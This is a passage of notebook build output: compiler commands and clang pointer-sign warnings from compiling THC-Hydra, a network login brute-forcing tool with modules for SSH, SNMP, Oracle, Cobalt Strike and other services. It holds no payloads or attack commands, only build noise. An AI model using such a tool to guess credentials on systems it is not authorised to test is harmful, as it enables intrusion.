      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "hydra-cobaltstrike.c:39:26: warning: passing 'unsigned char *' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  ret = hydra_recv_nb(s, &reply_byte_0, 1);\n",
      "                         ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:36:52: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_recv_nb(int32_t socket, char *buf, uint32_t length);\n",
      "                                                   ^\n",
      "hydra-cobaltstrike.c:44:26: warning: passing 'unsigned char *' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  ret = hydra_recv_nb(s, &reply_byte_1, 1);\n",
      "                         ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:36:52: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_recv_nb(int32_t socket, char *buf, uint32_t length);\n",
      "                                                   ^\n",
      "hydra-cobaltstrike.c:49:26: warning: passing 'unsigned char *' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  ret = hydra_recv_nb(s, &reply_byte_2, 1);\n",
      "                         ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:36:52: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_recv_nb(int32_t socket, char *buf, uint32_t length);\n",
      "                                                   ^\n",
      "hydra-cobaltstrike.c:54:26: warning: passing 'unsigned char *' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  ret = hydra_recv_nb(s, &reply_byte_3, 1);\n",
      "                         ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:36:52: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_recv_nb(int32_t socket, char *buf, uint32_t length);\n",
      "                                                   ^\n",
      "4 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-http-proxy-urlenum.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-snmp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "hydra-snmp.c:90:14: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "  if (strlen(password) > passwordlen)\n",
      "             ^~~~~~~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "hydra-snmp.c:91:26: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    passwordlen = strlen(password);\n",
      "                         ^~~~~~~~\n",
      "/usr/include/string.h:407:35: note: passing argument to parameter '__s' here\n",
      "extern size_t strlen (const char *__s)\n",
      "                                  ^\n",
      "hydra-snmp.c:98:13: warning: passing 'u_char [17]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    strncpy(bpass, password, sizeof(bpass) - 1);\n",
      "            ^~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:92:34: note: passing argument to parameter '__dest' here\n",
      "__NTH (strncpy (char *__restrict __dest, const char *__restrict __src,\n",
      "                                 ^\n",
      "hydra-snmp.c:98:20: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    strncpy(bpass, password, sizeof(bpass) - 1);\n",
      "                   ^~~~~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:92:65: note: passing argument to parameter '__src' here\n",
      "__NTH (strncpy (char *__restrict __dest, const char *__restrict __src,\n",
      "                                                                ^\n",
      "hydra-snmp.c:100:14: warning: passing 'u_char [17]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      strcat(bpass, password);\n",
      "             ^~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:128:33: note: passing argument to parameter '__dest' here\n",
      "__NTH (strcat (char *__restrict __dest, const char *__restrict __src))\n",
      "                                ^\n",
      "hydra-snmp.c:100:21: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      strcat(bpass, password);\n",
      "                    ^~~~~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:128:64: note: passing argument to parameter '__src' here\n",
      "__NTH (strcat (char *__restrict __dest, const char *__restrict __src))\n",
      "                                                               ^\n",
      "hydra-snmp.c:145:12: warning: passing 'u_char [17]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    strcpy(bpass, password);\n",
      "           ^~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:77:33: note: passing argument to parameter '__dest' here\n",
      "__NTH (strcpy (char *__restrict __dest, const char *__restrict __src))\n",
      "                                ^\n",
      "hydra-snmp.c:145:19: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "    strcpy(bpass, password);\n",
      "                  ^~~~~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:77:64: note: passing argument to parameter '__src' here\n",
      "__NTH (strcpy (char *__restrict __dest, const char *__restrict __src))\n",
      "                                                               ^\n",
      "hydra-snmp.c:147:14: warning: passing 'u_char [17]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      strcat(bpass, password);\n",
      "             ^~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:128:33: note: passing argument to parameter '__dest' here\n",
      "__NTH (strcat (char *__restrict __dest, const char *__restrict __src))\n",
      "                                ^\n",
      "hydra-snmp.c:147:21: warning: passing 'u_char *' (aka 'unsigned char *') to parameter of type 'const char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      strcat(bpass, password);\n",
      "                    ^~~~~~~~\n",
      "/usr/include/x86_64-linux-gnu/bits/string_fortified.h:128:64: note: passing argument to parameter '__src' here\n",
      "__NTH (strcat (char *__restrict __dest, const char *__restrict __src))\n",
      "                                                               ^\n",
      "hydra-snmp.c:243:29: warning: passing 'char *' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_md5(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                            ^~~~\n",
      "hydra-snmp.c:81:34: note: passing argument to parameter 'password' here\n",
      "void password_to_key_md5(u_char *password,   /* IN */\n",
      "                                 ^\n",
      "hydra-snmp.c:243:49: warning: passing 'char *' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_md5(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                                                ^~~~~~~~~~~~~~\n",
      "hydra-snmp.c:83:34: note: passing argument to parameter 'engineID' here\n",
      "                         u_char *engineID,   /* IN  - pointer to snmpEngineID  */\n",
      "                                 ^\n",
      "hydra-snmp.c:243:80: warning: passing 'char [256]' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_md5(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                                                                               ^~~\n",
      "hydra-snmp.c:85:34: note: passing argument to parameter 'key' here\n",
      "                         u_char *key) {      /* OUT - pointer to caller 16-octet buffer */\n",
      "                                 ^\n",
      "hydra-snmp.c:245:29: warning: passing 'char *' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_sha(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                            ^~~~\n",
      "hydra-snmp.c:134:34: note: passing argument to parameter 'password' here\n",
      "void password_to_key_sha(u_char *password,   /* IN */\n",
      "                                 ^\n",
      "hydra-snmp.c:245:49: warning: passing 'char *' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_sha(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                                                ^~~~~~~~~~~~~~\n",
      "hydra-snmp.c:136:34: note: passing argument to parameter 'engineID' here\n",
      "                         u_char *engineID,   /* IN  - pointer to snmpEngineID  */\n",
      "                                 ^\n",
      "hydra-snmp.c:245:80: warning: passing 'char [256]' to parameter of type 'u_char *' (aka 'unsigned char *') converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "        password_to_key_sha(pass, strlen(pass), snmpv3info + 6, snmpv3info[5], key);\n",
      "                                                                               ^~~\n",
      "hydra-snmp.c:138:34: note: passing argument to parameter 'key' here\n",
      "                         u_char *key) {      /* OUT - pointer to caller 20-octet buffer */\n",
      "                                 ^\n",
      "hydra-snmp.c:324:41: warning: passing 'char [1024]' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      DES_ncbc_encrypt(snmpv3_get2 + 2, buf, sizeof(snmpv3_get2) - 2, &symcbc, (const_DES_cblock *)(initVect), DES_ENCRYPT);\n",
      "                                        ^~~\n",
      "/usr/include/openssl/des.h:93:66: note: passing argument to parameter 'output' here\n",
      "void DES_ncbc_encrypt(const unsigned char *input, unsigned char *output,\n",
      "                                                                 ^\n",
      "hydra-snmp.c:355:42: warning: passing 'char [1024]' to parameter of type 'const unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      HMAC((EVP_MD *)EVP_md5(), key, 16, buffer, i - 1, hash, NULL);\n",
      "                                         ^~~~~~\n",
      "/usr/include/openssl/hmac.h:55:42: note: passing argument to parameter 'data' here\n",
      "                    const unsigned char *data, size_t data_len,\n",
      "                                         ^\n",
      "hydra-snmp.c:355:57: warning: passing 'char [64]' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      HMAC((EVP_MD *)EVP_md5(), key, 16, buffer, i - 1, hash, NULL);\n",
      "                                                        ^~~~\n",
      "/usr/include/openssl/hmac.h:56:36: note: passing argument to parameter 'md' here\n",
      "                    unsigned char *md, unsigned int *md_len);\n",
      "                                   ^\n",
      "hydra-snmp.c:358:43: warning: passing 'char [1024]' to parameter of type 'const unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      HMAC((EVP_MD *)EVP_sha1(), key, 20, buffer, i - 1, hash, NULL);\n",
      "                                          ^~~~~~\n",
      "/usr/include/openssl/hmac.h:55:42: note: passing argument to parameter 'data' here\n",
      "                    const unsigned char *data, size_t data_len,\n",
      "                                         ^\n",
      "hydra-snmp.c:358:58: warning: passing 'char [64]' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      HMAC((EVP_MD *)EVP_sha1(), key, 20, buffer, i - 1, hash, NULL);\n",
      "                                                         ^~~~\n",
      "/usr/include/openssl/hmac.h:56:36: note: passing argument to parameter 'md' here\n",
      "                    unsigned char *md, unsigned int *md_len);\n",
      "                                   ^\n",
      "hydra-snmp.c:415:53: warning: passing 'unsigned char [6]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      if ((j = hydra_memsearch(buf + k, buf[k + 3], snmpv3_nouser, sizeof(snmpv3_nouser))) < 0)\n",
      "                                                    ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:48:68: note: passing argument to parameter 'needle' here\n",
      "extern int32_t hydra_memsearch(char *haystack, int32_t hlen, char *needle, int32_t nlen);\n",
      "                                                                   ^\n",
      "hydra-snmp.c:429:31: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "          hydra_dump_asciihex(snmpv3info, snmpv3infolen);\n",
      "                              ^~~~~~~~~~\n",
      "./hydra-mod.h:42:48: note: passing argument to parameter 'string' here\n",
      "extern void hydra_dump_asciihex(unsigned char *string, int32_t length);\n",
      "                                               ^\n",
      "hydra-snmp.c:441:70: warning: passing 'unsigned char [6]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      } else if ((buf[off + 15] & 5) == 4 && hydra_memsearch(buf, i, snmpv3_nouser,\n",
      "                                                                     ^~~~~~~~~~~~~\n",
      "./hydra-mod.h:48:68: note: passing argument to parameter 'needle' here\n",
      "extern int32_t hydra_memsearch(char *haystack, int32_t hlen, char *needle, int32_t nlen);\n",
      "                                                                   ^\n",
      "hydra-snmp.c:515:24: warning: passing 'unsigned char [64]' to parameter of type 'char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "      hydra_send(sock, snmpv3_init, sizeof(snmpv3_init), 0);\n",
      "                       ^~~~~~~~~~~\n",
      "./hydra-mod.h:38:49: note: passing argument to parameter 'buf' here\n",
      "extern int32_t hydra_send(int32_t socket, char *buf, uint32_t size, int32_t options);\n",
      "                                                ^\n",
      "hydra-snmp.c:525:37: warning: passing 'char *' to parameter of type 'unsigned char *' converts between pointers to integer types where one is of the unique plain 'char' type and the other is not [-Wpointer-sign]\n",
      "                hydra_dump_asciihex(snmpv3info, snmpv3infolen);\n",
      "                                    ^~~~~~~~~~\n",
      "./hydra-mod.h:42:48: note: passing argument to parameter 'string' here\n",
      "extern void hydra_dump_asciihex(unsigned char *string, int32_t length);\n",
      "                                               ^\n",
      "26 warnings generated.\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-cvs.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-smtp.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-smtp-enum.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-sapr3.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-ssh.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-sshkey.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-teamspeak.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-postgres.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rsh.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-rlogin.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-oracle-listener.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-svn.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-pcanywhere.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-sip.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-oracle-sid.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n",
      "cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -c hydra-oracle.c -DLIBOPENSSL -DLIBNCURSES -DHAVE_PCRE -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include -I/usr/include\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,now: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,-z,relro: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: -Wl,--allow-multiple-definition: 'linker' input unused [-Wunused-command-line-argument]\n",
      "clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
